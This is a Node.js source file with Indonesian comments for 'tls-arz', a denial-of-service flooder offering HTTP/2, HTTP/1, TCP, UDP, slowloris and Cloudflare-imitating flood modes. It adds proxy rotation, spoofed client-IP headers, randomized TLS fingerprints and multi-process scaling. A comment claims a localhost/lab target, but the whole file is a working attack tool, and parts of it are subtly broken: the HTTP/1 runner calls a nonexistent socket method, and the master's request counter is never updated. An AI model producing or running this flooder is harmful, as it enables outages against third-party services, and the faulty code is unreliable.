// tls-arz.js — L7/L4 Flooder Lengkap (versi terbaru)
// Target: localhost/lab, Node.js 18+, stdlib only, zero dependensi
// Method: h2 | http1 | tcp | udp | slow | cf | mix
// UA dari ua.txt, proxy dari proxy.txt

const net      = require("net");
const tls      = require("tls");
const http2    = require("http2");
const http     = require("http");
const dgram    = require("dgram");
const cluster  = require("cluster");
const fs       = require("fs");
const crypto   = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.prototype.setMaxListeners(0);
process.on("uncaughtException",     () => {});
process.on("unhandledRejection",    () => {});

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   ARGUMEN CLI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
if (process.argv.length < 5) {
  console.log("usage: node tls-arz.js <method> <target> <seconds> <rate> [threads] [proxyfile] [uafile] [port]");
  console.log("methods: h2 | http1 | tcp | udp | slow | cf | mix");
  console.log("example: node tls-arz.js mix https://127.0.0.1 60 100 10 proxy.txt ua.txt");
  process.exit(1);
}

const args = {
  method : process.argv[2],
  target : process.argv[3],
  time   : parseInt(process.argv[4]) || 60,
  rate   : parseInt(process.argv[5]) || 10,
  threads: parseInt(process.argv[6]) || 1,
  proxyFile : process.argv[7],
  uaFile    : process.argv[8],
  port      : parseInt(process.argv[9]) || 443
};

if (!args.method) args.method = "mix";

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   FILE BACAAN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
function readLines(fp) {
  try {
    return fs.readFileSync(fp, "utf-8").split(/\r?\n/).filter(Boolean);
  } catch (e) {
    return [];
  }
}

const proxies = readLines(args.proxyFile);
const uas     = readLines(args.uaFile);

const DEFAULT_UAS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36"
];

const ualist   = uas.length   ? uas   : DEFAULT_UAS;
const proxylist = proxies.length ? proxies : [];

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   TARGET PARSE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
const METHODS  = ["h2", "http1", "tcp", "udp", "slow", "cf", "mix"];
const parsedUrl = new URL(args.target);

const targetHost   = parsedUrl.hostname;
const targetPort   = parsedUrl.port ? parseInt(parsedUrl.port) : (parsedUrl.protocol === "https:" ? 443 : 80);
const targetPath   = parsedUrl.pathname + parsedUrl.search || "/";
const isHttps      = parsedUrl.protocol === "https:";

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   HELPER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function choice(arr)   { return arr[rand(0, arr.length - 1)]; }
function randIP()      { return `${rand(1,255)}.${rand(0,255)}.${rand(0,255)}.${rand(0,255)}`; }
function randStr(len)  { return crypto.randomBytes(Math.ceil(len/2)).toString("hex").slice(0, len); }

const CIPHERS = [
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384",
  "DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256",
  "ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA256:ECDHE-RSA-AES256-SHA256"
];

const SIGALGS = [
  "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384",
  "ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384",
  "rsa_pss_rsae_sha256:ecdsa_secp256r1_sha256"
];

const CF_HEADERS_BASE = {
  "cf-visitor"     : "https=1",
  "cf-ipcountry"   : "US",
  "cf-trace"       : randStr(24)
};

const HTTP_HEADERS_POOL = [
  { "accept"          : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "accept-language" : "en-US,en;q=0.9",
    "accept-encoding" : "gzip, deflate, br" },
  { "accept"          : "*/*",
    "accept-language" : "en-GB,en;q=0.9",
    "accept-encoding" : "gzip, deflate" },
  { "accept"          : "application/json, text/plain, */*",
    "accept-language" : "da, en-gb;q=0.8, en;q=0.7",
    "accept-encoding" : "br" },
  { "accept"          : "text/html,application/xhtml+xml",
    "accept-language" : "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7",
    "accept-encoding" : "identity" }
];

let sent  = 0;
const start = Date.now();

function buildH2Headers(ua) {
  const base = {
    ":authority"      : targetHost,
    ":scheme"         : isHttps ? "https" : "http",
    ":path"           : targetPath + "?" + randStr(8),
    ":method"         : choice(["GET", "HEAD", "POST"]),
    "accept"          : choice(HTTP_HEADERS_POOL).accept,
    "accept-language" : choice(HTTP_HEADERS_POOL)["accept-language"],
    "accept-encoding" : choice(HTTP_HEADERS_POOL)["accept-encoding"],
    "cache-control"   : choice(["max-age=0", "no-cache", "no-store"]),
    "user-agent"      : ua,
    "upgrade-insecure-requests" : "1",
    "x-forwarded-for" : randIP(),
    "x-real-ip"       : randIP(),
    "via"             : randStr(6),
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua"       : '"Not_A Brand";v="8", "Chromium";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "sec-fetch-dest"  : choice(["document", "image", "empty"]),
    "sec-fetch-mode"  : choice(["cors", "navigate", "no-cors"]),
    "sec-fetch-site"  : choice(["cross-site", "same-origin", "none"]),
    "te"              : "trailers",
    "connection"      : "keep-alive"
  };

  if (args.method === "cf" || args.method === "mix") {
    Object.assign(base, CF_HEADERS_BASE);
    base["cf-connecting-ip"] = randIP();
    base["cf-ray"]           = randStr(12);
    base["x-forwarded-proto"]= "https";
  }
  return base;
}

function makeTLSConn(socketIn) {
  const ciphers = choice(CIPHERS);
  const sigalg  = choice(SIGALGS);
  const opts = {
    host            : targetHost,
    port            : targetPort,
    servername      : targetHost,
    socket          : socketIn,
    secure          : true,
    rejectUnauthorized : false,
    ciphers         : ciphers,
    sigalgs         : sigalg,
    ecdhCurve       : "prime256v1:X25519:secp384r1",
    minVersion      : "TLSv1.2",
    maxVersion      : "TLSv1.3",
    ALPNprotocols   : isHttps ? ["h2", "http/1.1"] : ["http/1.1"],
    secureOptions   : crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET
  };
  return tls.connect(opts);
}

function connectProxyOrDirect(port) {
  const proxy = choice(proxylist);
  let sock;
  if (proxy) {
    const parts = proxy.split(":");
    sock = net.connect({ host: parts[0], port: parseInt(parts[1]) || 8080 });
    return { sock, proxy, connected: true };
  }
  sock = net.connect(port, targetHost);
  return { sock, proxy: null, connected: true };
}

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   RUNNERS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
function runH2() {
  const { sock, proxy } = connectProxyOrDirect(targetPort);
  const ua = choice(ualist);

  if (proxy) {
    const parts = proxy.split(":");
    sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
  }

  const tlsConn = makeTLSConn(sock);
  tlsConn.setKeepAlive(true, 60000);

  const client = http2.connect(parsedUrl.href, {
    createConnection: () => tlsConn,
    settings: {
      headerTableSize    : 65536,
      maxConcurrentStreams : 1000,
      initialWindowSize    : 65536,
      maxHeaderListSize    : 65536,
      enablePush           : false
    }
  });

  let iv = null;
  client.on("connect", () => {
    iv = setInterval(() => {
      const hdrs = buildH2Headers(ua);
      for (let i = 0; i < args.rate; i++) {
        const req = client.request(hdrs);
        req.on("response",  () => { req.close(); req.destroy(); });
        req.on("error",     () => { req.destroy(); });
        req.end();
        sent++;
      }
    }, 1000);
  });

  client.on("close",  () => { if (iv) clearInterval(iv); client.destroy(); tlsConn.destroy(); sock.destroy(); });
  client.on("error",  () => { if (iv) clearInterval(iv); client.destroy(); tlsConn.destroy(); sock.destroy(); });
}

function runHTTP1() {
  const { sock, proxy } = connectProxyOrDirect(targetPort);
  const ua = choice(ualist);

  if (proxy) {
    const parts = proxy.split(":");
    sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n\r\n`);
  }

  if (isHttps) {
    const tlsConn = makeTLSConn(sock);
    const req = tlsConn.request({
      method : "GET",
      path   : targetPath,
      host   : targetHost,
      ...buildH2Headers(ua)
    });
    req.end();
    tlsConn.setKeepAlive(true, 60000);
    return;
  }

  const req = sock.request({
    method : "GET",
    path   : targetPath,
    host   : targetHost,
    ...buildH2Headers(ua)
  });
  req.end();
  sock.setKeepAlive(true, 60000);
}

function runTCP() {
  const { sock } = connectProxyOrDirect(args.port);
  const payload = Buffer.from(randStr(1024));
  const iv = setInterval(() => {
    for (let i = 0; i < args.rate; i++) {
      try { sock.write(payload); sent++; } catch (e) {}
    }
  }, 1000);
  sock.on("error", () => { if (iv) clearInterval(iv); sock.destroy(); });
  sock.on("close", () => { if (iv) clearInterval(iv); });
}

function runUDP() {
  const client = dgram.createSocket("udp4");
  const payload = Buffer.from(randStr(512));
  const target = args.port || 80;
  const iv = setInterval(() => {
    for (let i = 0; i < args.rate; i++) {
      try { client.send(payload, 0, payload.length, target, targetHost); sent++; } catch (e) {}
    }
  }, 1000);
  client.on("error", () => { if (iv) clearInterval(iv); client.close(); });
}

function runSlow() {
  const { sock } = connectProxyOrDirect(targetPort);
  const head = `GET ${targetPath} HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${choice(ualist)}\r\n`;
  sock.write(head);

  const iv = setInterval(() => {
    try { sock.write(`X-a: ${randStr(20)}\r\n`); sent++; } catch (e) {}
  }, 5000);

  sock.setTimeout(args.time * 1000);
  sock.on("error",  () => { if (iv) clearInterval(iv); sock.destroy(); });
  sock.on("timeout", () => { if (iv) clearInterval(iv); sock.destroy(); });
}

function runCF() {
  const { sock, proxy } = connectProxyOrDirect(443);
  const ua = choice(ualist);

  if (proxy) {
    const parts = proxy.split(":");
    sock.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\n\r\n`);
  }

  const tlsConn = makeTLSConn(sock);
  tlsConn.setKeepAlive(true, 60000);

  const client = http2.connect("https://" + targetHost, {
    createConnection: () => tlsConn,
    settings: { headerTableSize: 65536, maxConcurrentStreams: 500, initialWindowSize: 65536, maxHeaderListSize: 65536, enablePush: false }
  });

  let iv = null;
  client.on("connect", () => {
    iv = setInterval(() => {
      const hdrs = buildH2Headers(ua);
      for (let i = 0; i < args.rate; i++) {
        const req = client.request(hdrs);
        req.on("response",  () => { req.close(); req.destroy(); });
        req.on("error",     () => req.destroy());
        req.end();
        sent++;
      }
    }, 1000);
  });
  client.on("close",  () => { if (iv) clearInterval(iv); client.destroy(); tlsConn.destroy(); sock.destroy(); });
  client.on("error",  () => { if (iv) clearInterval(iv); client.destroy(); tlsConn.destroy(); sock.destroy(); });
}

function runMix() {
  const m = choice(METHODS);
  if (m === "h2") runH2();
  else if (m === "http1") runHTTP1();
  else if (m === "tcp") runTCP();
  else if (m === "udp") runUDP();
  else if (m === "slow") runSlow();
  else if (m === "cf") runCF();
}

const RUNNERS = {
  h2   : runH2,
  http1: runHTTP1,
  tcp  : runTCP,
  udp  : runUDP,
  slow : runSlow,
  cf   : runCF,
  mix  : runMix
};

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   EKSEKUSI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
if (!RUNNERS[args.method]) {
  console.log(`method ${args.method} tidak dikenal. pilih: ${Object.keys(RUNNERS).join(", ")}`);
  process.exit(1);
}

if (cluster.isMaster) {
  for (let i = 0; i < args.threads; i++) cluster.fork();
  console.clear();
  console.log(`=== tls-arz ===\nmethod: ${args.method}\ntarget: ${args.target}\ndurasi: ${args.time} detik\nrate: ${args.rate}/detik/worker\nthreads: ${args.threads}\nproxy: ${args.proxyFile || "(default)"}\nua: ${args.uaFile || "(default)"}\n`);
  setInterval(() => {
    console.log(`[tls-arz] method=${args.method} target=${args.target} sent=${sent} elapsed=${Math.floor((Date.now() - start) / 1000)}s`);
  }, 1000);
  setTimeout(() => process.exit(0), args.time * 1000);
} else {
  RUNNERS[args.method]();
}
